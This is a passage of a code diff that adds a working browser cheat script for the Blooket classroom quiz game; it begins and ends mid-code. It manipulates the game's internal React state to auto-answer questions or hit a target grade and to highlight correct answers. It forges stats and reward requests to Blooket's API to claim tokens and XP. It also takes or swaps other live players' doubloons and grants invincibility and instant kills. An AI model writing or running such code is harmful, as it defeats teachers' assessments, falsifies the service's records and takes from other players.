+                            this.enabled = true;
+                            this.data = setInterval(() => {
+                                const { stateNode: { state, props } } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                                [...document.querySelectorAll(`[class*="answerContainer"]`)].forEach((answer, i) => {
+                                    if ((state.question || props.client.question).correctAnswers.includes((state.question || props.client.question).answers[i]))
+                                        answer.style.boxShadow = "unset";
+                                });
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Percent Auto Answer",
+                    description: "Answers questions correctly or incorrectly depending on the goal grade given (Disable and re-enable to update goal)",
+                    inputs: [
+                        {
+                            name: "Target Grade",
+                            type: "number"
+                        }
+                    ],
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function (target) {
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            this.data = setInterval(TARGET => {
+                                try {
+                                    const question = stateNode.state.question || stateNode.props.client.question;
+                                    if (stateNode.state.stage == "feedback" || stateNode.state.feedback) return document.querySelector('[class*="feedback"], [id*="feedback"]')?.firstChild?.click?.();
+                                    else if (document.querySelector("[class*='answerContainer']") || document.querySelector("[class*='typingAnswerWrapper']")) {
+                                        let correct = 0, total = 0;
+                                        for (let corrects in stateNode.corrects) correct += stateNode.corrects[corrects];
+                                        for (let incorrect in stateNode.incorrects) total += stateNode.incorrects[incorrect];
+                                        total += correct;
+                                        const yes = total == 0 || Math.abs(correct / (total + 1) - TARGET) >= Math.abs((correct + 1) / (total + 1) - TARGET);
+                                        if (stateNode.state.question.qType != "typing") {
+                                            const answerContainers = document.querySelectorAll("[class*='answerContainer']");
+                                            for (let i = 0; i < answerContainers.length; i++) {
+                                                const contains = question.correctAnswers.includes(question.answers[i]);
+                                                if (yes && contains || !yes && !contains) return answerContainers[i]?.click?.();
+                                            }
+                                            answerContainers[0].click();
+                                        } else Object.values(document.querySelector("[class*='typingAnswerWrapper']"))[1].children._owner.stateNode.sendAnswer(yes ? question.answers[0] : Math.random().toString(36).substring(2));
+                                    }
+                                } catch { }
+                            }, 100, (target ?? 100) / 100);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    },
+                },
+                {
+                    name: "Auto Answer",
+                    description: "Click the correct answer for you",
+                    run: function () {
+                        const { stateNode: { state: { question, stage, feedback }, props: { client: { question: pquestion } } } } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        try {
+                            if (question.qType != "typing") if (stage !== "feedback" && !feedback) [...document.querySelectorAll(`[class*="answerContainer"]`)][(question || pquestion).answers.map((x, i) => (question || pquestion).correctAnswers.includes(x) ? i : null).filter(x => x != null)[0]]?.click?.();
+                            else document.querySelector('[class*="feedback"]')?.firstChild?.click?.();
+                            else Object.values(document.querySelector("[class*='typingAnswerWrapper']"))[1].children._owner.stateNode.sendAnswer(question.answers[0])
+                        } catch { }
+                    }
+                },
+                {
+                    name: "Highlight Answers",
+                    description: "Colors answers to be red or green highlighting the correct ones",
+                    run: function () {
+                        const { stateNode: { state, props } } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        [...document.querySelectorAll(`[class*="answerContainer"]`)].forEach((answer, i) => {
+                            if ((state.question || props.client.question).correctAnswers.includes((state.question || props.client.question).answers[i])) answer.style.backgroundColor = "rgb(0, 207, 119)";
+                            else answer.style.backgroundColor = "rgb(189, 15, 38)";
+                        });
+                    }
+                },
+                {
+                    name: "Spam Buy Blooks",
+                    description: "Opens a box an amount of times",
+                    inputs: [
+                        {
+                            name: "Box",
+                            type: "options",
+                            options: () => Array.from(document.querySelectorAll("[class*='packsWrapper'] > div")).reduce((a, b) => {
+                                b.querySelector("[class*='blookContainer'] > img") || a.push(b.querySelector("[class*='packImgContainer'] > img").alt);
+                                return a;
+                            }, [])
+                        },
+                        {
+                            name: "Amount",
+                            type: "number"
+                        },
+                        {
+                            name: "Show Unlocks",
+                            type: "options",
+                            options: [
+                                {
+                                    name: "Show Unlocks",
+                                    value: true
+                                },
+                                {
+                                    name: "Don't Show Unlocks",
+                                    value: false
+                                }
+                            ]
+                        }
+                    ],
+                    run: async function (_box, amountToOpen, alertBlooks) {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        window.prompt = i.contentWindow.prompt.bind(window);
+                        window.confirm = i.contentWindow.confirm.bind(window);
+                        i.remove();
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        let prices = Array.from(document.querySelectorAll("[class*='packsWrapper'] > div")).reduce((a, b) => {
+                            b.querySelector("[class*='blookContainer'] > img") || (a[b.querySelector("[class*='packImgContainer'] > img").alt] = parseInt(b.querySelector("[class*='packBottom']").textContent));
+                            return a;
+                        }, {});
+                        let box = _box.split(' ').map(str => str.charAt(0).toUpperCase() + str.slice(1).toLowerCase()).join(' ');
+                        const cost = prices[box];
+                        if (!cost) return alert("I couldn't find that box!");
+        
+                        let amount = Math.min(Math.floor(stateNode.state.tokens / cost), amountToOpen);
+                        if (amount == 0) return alert("You do not have enough tokens!");
+        
+                        let blooks = {};
+                        let now = Date.now();
+        
+                        for (let i = 0; i < amount; i++) {
+                            await stateNode.buyPack(true, box);
+        
+                            blooks[stateNode.state.unlockedBlook] ||= 0;
+                            blooks[stateNode.state.unlockedBlook]++;
+        
+                            let before = Date.now();
+        
+                            now += Date.now() - before;
+        
+                            stateNode.setState({ canOpen: true, currentPack: "", opening: alertBlooks, doneOpening: alertBlooks, openPack: alertBlooks });
+                            clearTimeout(stateNode.canOpenTimeout);
+                        }
+                        await new Promise(r => setTimeout(r));
+                        alert(`(${Date.now() - now}ms) Results:\n${Object.entries(blooks).map(([blook, amount]) => `    ${blook} ${amount}`).join(`\n`)}`);
+                    }
+                },
+        
+                {
+                    name: "Host Any Gamemode",
+                    description: "Change the selected gamemode on the host settings page",
+                    inputs: [
+                        {
+                            name: "Gamemode",
+                            type: "options",
+                            options: ["Racing", "Classic", "Factory", "Cafe", "Defense2", "Defense", "Royale", "Gold", "Candy", "Brawl", "Hack", "Pirate", "Fish", "Dino", "Toy", "Rush"]
+                        }
+                    ],
+                    run: function (type) {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        window.prompt = i.contentWindow.prompt.bind(window);
+                        i.remove();
+                        if (location.pathname != "/host/settings") return alert("Run this script on the host settings page");
+                        const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ settings: { type } });
+                    }
+                },
+                {
+                    name: "Change Blook Ingame",
+                    description: "Changes your blook",
+                    inputs: [
+                        {
+                            name: "Blook (case sensitive)",
+                            type: "string",
+                        }
+                    ],
+                    run: function (blook) {
+                        let { props } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode;
+                        props.client.blook = blook;
+                        props.liveGameController.setVal({ path: `c/${props.client.name}/b`, val: blook });
+                    }
+                },
+                {
+                    name: "Get Daily Rewards",
+                    description: "Gets max daily tokens and xp",
+                    run: async function () {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        if (!location.href.includes("play.blooket.com")) (alert("This cheat only works on play.blooket.com, opening a new tab."), window.open("https://play.blooket.com/"));
+                        else {
+                            const { t } = await fetch("https://play.blooket.com/api/playersessions/solo", {
+                                body: JSON.stringify({
+                                    gameMode: "Factory",
+                                    questionSetId: ["60101da869e8c70013913b59", "625db660c6842334835cb4c6", "60268f8861bd520016eae038", "611e6c804abdf900668699e3", "60ba5ff6077eb600221b7145", "642467af9b704783215c1f1b", "605bd360e35779001bf57c5e", "6234cc7add097ff1c9cff3bd", "600b1491d42a140004d5215a", "5db75fa3f1fa190017b61c0c", "5fac96fe2ca0da00042b018f", "600b14d8d42a140004d52165", "5f88953cdb209e00046522c7", "600b153ad42a140004d52172", "5fe260e72a505b00040e2a11", "5fe3d085a529560004cd3076", "5f5fc017aee59500041a1456", "608b0a5863c4f2001eed43f4", "5fad491512c8620004918ace", "5fc91a9b4ea2e200046bd49a", "5c5d06a7deebc70017245da7", "5ff767051b68750004a6fd21", "5fdcacc85d465a0004b021b9", "5fb7eea20bd44300045ba495"][Math.floor(Math.random() * 24)]
+                                }),
+                                credentials: "include",
+                                method: "POST"
+                            }).then(x => x.json());
+                            await fetch("https://play.blooket.com/api/playersessions/landings", {
+                                body: JSON.stringify({ t }),
+                                credentials: "include",
+                                method: "POST"
+                            });
+                            await fetch("https://play.blooket.com/api/playersessions/questions?t=" + t, { credentials: "include" });
+                            const { name, blook: { name: blookUsed } } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.props.user.data;
+                            await fetch("https://play.blooket.com/api/users/factorystats", {
+                                body: JSON.stringify({
+                                    blookUsed, t, name,
+                                    cash: Math.floor(Math.random() * 90000000) + 10000000,
+                                    correctAnswers: Math.floor(Math.random() * 500) + 500,
+                                    upgrades: Math.floor(Math.random() * 300) + 300,
+                                    mode: "Time-Solo",
+                                    nameUsed: "You",
+                                    place: 1,
+                                    playersDefeated: 0,
+                                }),
+                                credentials: "include",
+                                method: "PUT"
+                            });
+                            fetch("https://play.blooket.com/api/users/add-rewards", {
+                                body: JSON.stringify({ t, name, addedTokens: 500, addedXp: 300 }),
+                                credentials: "include",
+                                method: "PUT"
+                            }).then(x => x.json())
+                                .then(({ dailyReward }) => alert(`Added max tokens and xp, and got ${dailyReward} daily wheel tokens!`))
+                                .catch(() => alert('There was an error when adding rewards.'));
+                        }
+                    }
+                },
+                {
+                    name: "Every Answer Correct",
+                    description: "Sets every answer to be correct",
+                    run: function () {
+                        const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.freeQuestions = stateNode.freeQuestions?.map?.(q => ({ ...q, correctAnswers: q.answers }));
+                        stateNode.questions = stateNode.questions?.map?.(q => ({ ...q, correctAnswers: q.answers }));
+                        stateNode.props.client.questions = stateNode.props.client.questions.map(q => ({ ...q, correctAnswers: q.answers }));
+                    }
+                },
+                {
+                    name: "Subtle Highlight Answers",
+                    description: "Removes the shadow from correct answers",
+                    run: function () {
+                        const { stateNode: { state, props } } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        [...document.querySelectorAll(`[class*="answerContainer"]`)].forEach((answer, i) => {
+                            if ((state.question || props.client.question).correctAnswers.includes((state.question || props.client.question).answers[i]))
+                                answer.style.boxShadow = "unset";
+                        });
+                    }
+                },
+                {
+                    name: "Remove Name Limit",
+                    description: "Sets the name limit to 120, which is the actual max name length limit",
+                    run: function () {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        document.querySelector('input[class*="nameInput"]').maxLength = 120; /* 120 is the actual limit */
+                        alert("Removed name length limit");
+                    }
+                },
+                {
+                    name: "Remove Random Name",
+                    description: "Allows you to put a custom name",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ isRandom: false, client: { name: "" } });
+                        document.querySelector('[class*="nameInput"]')?.focus?.();
+                    }
+                },
+                {
+                    name: "Sell Duplicate Blooks",
+                    description: "Sell all duplicate blooks leaving you with 1 each",
+                    run: async function () {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        window.confirm = i.contentWindow.confirm.bind(window);
+                        i.remove();
+                        if (/dashboard.*\/blooks/.test(window.location.href)) {
+                            if (confirm(`Are you sure you want to sell your dupes? (Legendaries and rarer will not be sold)`)) {
+                                let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                                let now = Date.now(), results = "";
+                                for (const blook in stateNode.state.blookData) if (stateNode.state.blookData[blook] > 1) {
+                                    stateNode.setState({ blook, numToSell: stateNode.state.blookData[blook] - 1 });
+                                    if (["Legendary", "Chroma", "Mystical"].includes(document.querySelector("[class*='highlightedRarity']").innerText.trim())) continue;
+                                    results += `    ${blook} ${stateNode.state.blookData[blook] - 1}\n`;
+                                    await stateNode.sellBlook({ preventDefault: () => { } }, true);
+                                }
+                                alert(`(${Date.now() - now}ms) Results:\n${results.trim()}`);
+                            }
+                        } else alert("This can only be ran in the Blooks page.");
+                    }
+                },
+            ],
+            voyage: [
+                {
+                    name: "Max Levels",
+                    description: "Maxes out all islands and your boat",
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ islandLevels: new Array(stateNode.state.islandLevels.length).fill(5) }, stateNode.updateBoatLevel);
+                    }
+                },
+                {
+                    name: "Set Doubloons",
+                    description: "Sets Doubloons",
+                    inputs: [{
+                        name: "Amount",
+                        type: "number"
+                    }],
+                    run: function (doubloons) {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.prompt = i.contentWindow.prompt.bind(window);
+                        i.remove();
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ doubloons });
+                        stateNode.props.liveGameController.setVal({
+                            path: `c/${stateNode.props.client.name}/d`,
+                            val: doubloons
+                        });
+                    }
+                },
+                {
+                    name: "Start Heist",
+                    description: "Starts a heist on someone",
+                    inputs: [{
+                        name: "Player",
+                        type: "options",
+                        options: () => {
+                            let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            return new Promise(res => stateNode.props.liveGameController._liveApp ? stateNode.props.liveGameController.getDatabaseVal("c", (players) => players && res(Object.keys(players))) : res([]));
+                        }
+                    }],
+                    run: function (target) {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.prompt = i.contentWindow.prompt.bind(window);
+                        i.remove();
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+        
+                        stateNode.props.liveGameController.getDatabaseVal("c", function (val) {
+                            const players = Object.entries(val || {}).reduce((a, [name, c]) => (name != stateNode.props.client.name && a.push({ name, blook: c.b, doubloons: c.d || 0 }), a), []);
+                            if (players.length === 0) {
+                                stateNode.questionsToAnswer = 1;
+                                return void stateNode.randomQ();
+                            }
+                            const { name, blook, doubloons } = players.find(x => x.name == target) || players.sort((a, b) => b.doubloons - a.doubloons)[0];
+                            stateNode.setState({
+                                stage: "heist",
+                                heistInfo: { name, blook },
+                                prizeAmount: Math.max(1000, doubloons)
+                            });
+                        });
+                    }
+                },
+                {
+                    name: "Swap Doubloons",
+                    description: "Swaps Doubloons with someone",
+                    inputs: [{
+                        name: "Player",
+                        type: "options",
+                        options: () => {
+                            let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            return new Promise(res => stateNode.props.liveGameController._liveApp ? stateNode.props.liveGameController.getDatabaseVal("c", (players) => players && res(Object.keys(players))) : res([]));
+                        }
+                    }],
+                    run: async function (player) {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.prompt = i.contentWindow.prompt.bind(window);
+                        i.remove();
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        let players = Object.entries(await new Promise(r => stateNode.props.liveGameController.getDatabaseVal("c", r))).sort((a, b) => b[1].d - a[1].d).filter(x => x[0] != stateNode.props.client.name),
+                            target = players.find(x => x[0] == player) || players[0];
+                        stateNode.props.liveGameController.setVal({
+                            path: `c/${stateNode.props.client.name}`,
+                            val: {
+                                b: stateNode.props.client.blook,
+                                d: target[1].d,
+                                tat: `${target[0]}:${target[1].d - stateNode.state.doubloons}`
+                            }
+                        });
+                        stateNode.setState({ doubloons: target[1].d });
+                    }
+                },
+                {
+                    name: "Take Doubloons",
+                    description: "Takes Doubloons from someone",
+                    inputs: [{
+                        name: "Player",
+                        type: "options",
+                        options: () => {
+                            let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            return new Promise(res => stateNode.props.liveGameController._liveApp ? stateNode.props.liveGameController.getDatabaseVal("c", (players) => players && res(Object.keys(players))) : res([]));
+                        }
+                    }],
+                    run: async function (player) {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.prompt = i.contentWindow.prompt.bind(window);
+                        i.remove();
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        let players = Object.entries(await new Promise(r => stateNode.props.liveGameController.getDatabaseVal("c", r))).sort((a, b) => b[1].d - a[1].d).filter(x => x[0] != stateNode.props.client.name),
+                            target = players.find(x => x[0] == player) || players[0];
+                        stateNode.setState({ doubloons: stateNode.state.doubloons + target[1].d });
+                        stateNode.props.liveGameController.setVal({
+                            path: `c/${stateNode.props.client.name}`,
+                            val: {
+                                b: stateNode.props.client.blook,
+                                d: target[1].d,
+                                tat: `${target[0]}:${target[1].d}`
+                            }
+                        });
+                    }
+                }
+            ],
+            brawl: [
+                {
+                    name: "Double Enemy XP",
+                    description: "Doubles enemy XP drop value",
+                    run: function () {
+                        for (const collider of Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(x => x.callbackContext?.toString().includes('dmgCd'))) {
+                            const enemies = collider.object2;
+                            let _start = enemies.classType.prototype.start;
+                            enemies.classType.prototype.start = function () { _start.apply(this, arguments), this.val *= 2 }
+                            enemies.children.entries.forEach(e => e.val *= 2);
+                        }
+                    }
+                },
+                {
+                    name: "Half Enemy Speed",
+                    description: "Makes enemies move 2x slower",
+                    run: function () {
+                        for (const collider of Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(x => x.callbackContext?.toString().includes('dmgCd'))) {
+                            const enemies = collider.object2;
+                            let _start = enemies.classType.prototype.start;
+                            enemies.classType.prototype.start = function () { _start.apply(this, arguments), this.speed *= .5 }
+                            enemies.children.entries.forEach(e => e.speed *= .5);
+                        }
+                    }
+                },
+                {
+                    name: "Instant Kill",
+                    description: "Sets all enemies health to 1",
+                    run: function () {
+                        for (const collider of Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(x => x.callbackContext?.toString().includes('dmgCd'))) {
+                            const enemies = collider.object2;
+                            let _start = enemies.classType.prototype.start;
+                            enemies.classType.prototype.start = function () { _start.apply(this, arguments), this.hp = 1 }
+                            enemies.children.entries.forEach(e => e.hp = 1);
+                        }
+                    }
+                },
+                {
+                    name: "Invincibility",
+                    description: "Makes you invincible",
+                    run: function () {
+                        for (const collider of Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(x => x.callbackContext?.toString().includes('invulnerableTime') || x.callbackContext?.toString().includes('dmgCd'))) collider.collideCallback = () => { };
+                    }
+                },
+                {
+                    name: "Magnet",
+                    description: "Pulls all xp towards you",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.state.game.scene.physics.world.colliders._active.find(x => x.collideCallback?.toString().includes('0x5dc)')).collideCallback({ active: true }, { active: true, setActive() { }, setVisible() { } });
+                    }
+                },
+                {
+                    name: "Max Current Abilities",
+                    description: "Maxes out all your current abilities",
+                    run: function () {
+                        const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        for (const [ability, level] of Object.entries(stateNode.state.abilities)) for (let i = 0; i < (10 - level); i++) stateNode.state.game.scene.game.events.emit("level up", ability, stateNode.state.abilities[ability]++);
+                        stateNode.setState({
+                            level: stateNode.state.game.scene.level = [1, 3, 5, 10, 15, 25, 35].sort((a, b) => Math.abs(a - stateNode.state.level) - Math.abs(b - stateNode.state.level))[0] - 1
+                        });
+                    }
+                },
+                {
+                    name: "Next Level",
+                    description: "Skips to the next level",
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        let { object1: player, object2: xp } = stateNode.state.game.scene.physics.world.colliders._active.find(x => x.collideCallback?.toString().includes("emit']('xp"));
+                        xp.get().spawn(player.x, player.y, ((e) => 1 === e ? 1 : e < 5 ? 5 : e < 10 ? 10 : e < 20 ? 20 : e < 30 ? 30 : e < 40 ? 40 : e < 50 ? 50 : 100)(stateNode.state.level) - stateNode.xp);
+                    }
+                },
+                {
+                    name: "Remove Obstacles",
+                    description: "Removes all rocks and obstacles",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.state.game.scene.physics.world.bodies.entries.forEach(body => {
+                            try {
+                                if (body.gameObject.frame.texture.key.includes("obstacle")) body.gameObject.destroy();
+                            } catch { }
+                        });
+                    }
+                },
+                {
+                    name: "Kill Enemies",
+                    description: "Kills all current enemies",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.state.game.scene.physics.world.bodies.entries.forEach(x => x?.gameObject?.receiveDamage?.(x.gameObject.hp, 1));
+                    }
+                },
+                {
+                    name: "Reset Health",
+                    description: "Resets health and gives invincibility for 3 seconds",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.state.game.scene.game.events._events.respawn.fn();
+                    }
+                }
+            ],
+            cafe: [
+                {
+                    name: "Max Items",
+                    description: "Maxes out items in the shop (Only usable in the shop)",
+                    run: function () {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        if (window.location.pathname !== "/cafe/shop") alert("This can only be run in the shop");
+                        else {
+                            const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            stateNode.setState({ items: Object.fromEntries(Object.entries(stateNode.state.items).map(x => [x[0], 5])) });
+                        }
+                    }
+                },
+                {
+                    name: "Remove Customers",
+                    description: "Skips the current customers (Not usable in the shop)",
+                    run: function () {
+                        const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.state.customers.forEach((customer, i) => Object.keys(customer).length && stateNode.removeCustomer(i, true));
+                    }
+                },
+                {
+                    name: "Reset Abilities",
+                    description: "Resets used abilities in shop (Only usable in the shop)",
+                    run: function () {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        if (window.location.pathname !== "/cafe/shop") alert("This can only be run in the shop");
+                        else {
+                            const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            stateNode.setState({ abilities: Object.fromEntries(Object.entries(stateNode.state.abilities).map(x => [x[0], 5])) });
+                        }
+                    }
+                },
+                {
+                    name: "Set Cash",
+                    description: "Sets cafe cash",
+                    inputs: [{
+                        name: "Amount",
+                        type: "number"
+                    }],
+                    run: function (cafeCash) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ cafeCash });
+                        stateNode.props.liveGameController.setVal({
+                            path: `c/${stateNode.props.client.name}`,
+                            val: {
+                                b: stateNode.props.client.blook,
+                                ca: cafeCash
+                            }
+                        });
+                    }
+                },
+                {
+                    name: "Stock Food",
+                    description: "Stocks all food to 99 (Not usable in the shop)",
+                    run: function () {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        if (window.location.pathname !== "/cafe") alert("This can't be run in the shop");
+                        else {
+                            const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            stateNode.setState({ foods: stateNode.state.foods.map(e => ({ ...e, stock: 99, level: 5 })) });
+                        }
+                    }
+                }
+            ],
+            crypto: [
+                {
+                    name: "Choice ESP",
+                    description: "Shows what each choice will give you",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            this.data = setInterval(() => {
+                                let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                                let { text } = stateNode.state.choices[0];
+                                let chest = document.querySelector('[class^=styles__feedbackContainer___]');
+                                if (chest.children.length <= 4) {
+                                    let choice = document.createElement('div');
+                                    choice.style.color = "white";
+                                    choice.style.fontFamily = "Inconsolata,Helvetica,monospace,sans-serif";
+                                    choice.style.fontSize = "2em";
+                                    choice.style.display = "flex";
+                                    choice.style.justifyContent = "center";
+                                    choice.style.marginTop = "675px";
+                                    choice.innerText = text;
+                                    chest.append(choice);
+                                }
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Password ESP",
+                    description: "Highlights the correct password",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            this.data = setInterval(() => {
+                                let { state } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode;
+                                if (state.stage == "hack") [...document.querySelector('div[class^=styles__buttonContainer]').children].forEach(button => {
+                                    if (button.innerText == state.correctPassword) return;
+                                    button.style.outlineColor = "rgba(255, 64, 64, 0.8)";
+                                    button.style.backgroundColor = "rgba(255, 64, 64, 0.8)";
+                                    button.style.textShadow = "0 0 1px #f33";
+                                });
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Always Triple",
+                    description: "Always get triple crypto",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        if (!this.enabled) {
+                            this.enabled = true;
